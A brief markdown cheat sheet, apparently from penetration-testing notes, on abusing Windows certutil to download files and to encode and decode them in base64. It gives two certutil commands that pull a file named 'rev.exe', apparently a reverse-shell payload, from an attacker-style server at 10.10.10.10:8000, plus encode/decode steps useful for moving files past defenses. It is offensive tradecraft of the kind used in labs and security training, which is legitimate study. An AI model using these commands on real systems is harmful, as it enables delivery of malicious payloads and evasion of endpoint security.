# Using certutil to download file 
## Link to lolbas 
- https://lolbas-project.github.io/lolbas/Binaries/Certutil/#encode

## Download
```powershell
certutil.exe -urlcache -split -f http://10.10.10.10:8000/rev.exe rev.exe
certutil.exe -verifyctl -f -split http://10.10.10.10:8000/rev.exe rev.exe
```

## Download / Upload using base64
### Encode
```powershell
certutil -encode inputFileName encodedOutputFileName
```

### Decode 
```powershell
certutil -decode encodedInputFileName decodedOutputFileName
```

### Decode (Kali linux)
```bash
# Note : It is very important to add the double slash at the beginning
echo "//50AGUAcwB0AF8AYgA2ADQAXwBjAGUAcgB0AHUAdABpAGwADQAKAA==" | base64 -d
```